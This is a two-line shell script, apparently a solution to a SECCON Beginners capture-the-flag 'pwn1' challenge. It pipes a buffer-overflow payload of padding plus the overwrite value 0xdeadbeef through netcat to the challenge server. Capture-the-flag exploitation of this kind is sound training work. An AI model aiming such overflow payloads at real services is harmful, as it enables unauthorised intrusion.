#!/bin/bash
python -c "print 'A'*44+'\xef\xbe\xad\xde'" | nc pwn1.chall.beginners.seccon.jp 16268
